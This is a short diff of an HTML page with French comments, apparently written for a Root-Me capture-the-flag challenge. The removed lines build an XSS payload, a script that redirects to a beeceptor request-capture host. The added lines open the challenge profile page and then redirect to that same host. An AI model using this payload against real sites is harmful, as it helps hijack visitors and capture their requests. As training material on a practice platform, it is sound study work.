@@ -7,29 +7,15 @@
 </head>
 <body id="body">
   <script>
-    // Création du texte avec les balises script échappées correctement
-    let text = `${"<script>document.location='https://volatile.free.beeceptor.com'<\/script>"}`;
     
-    // Copier dans le presse-papiers
-    navigator.clipboard.writeText(text)
-      .then(() => console.log("Texte copié dans le presse-papiers"))
-      .catch(err => console.error("Erreur lors de la copie:", err));
-    
-    // Ouvrir une nouvelle fenêtre
     const newWindow = window.open('http://challenge01.root-me.org:58003/profile');
-    
-    // Attendre 1 seconde avant d'exécuter le reste du code
+      
     setTimeout(() => {
       if (newWindow) {
-        try {
-            // Votre code pour interagir avec la nouvelle fenêtre
-            console.log("Fenêtre ouverte avec succès");
-        } catch (error) {
-          console.error('Erreur lors de l\'accès au contenu:', error);
-          // Gestion de l'erreur de politique de même origine (CORS)
-        }
+        document.location='https://volatile.free.beeceptor.com';
       }
     }, 1000); // Délai d'une seconde
   </script>
+    
 </body>
 </html>
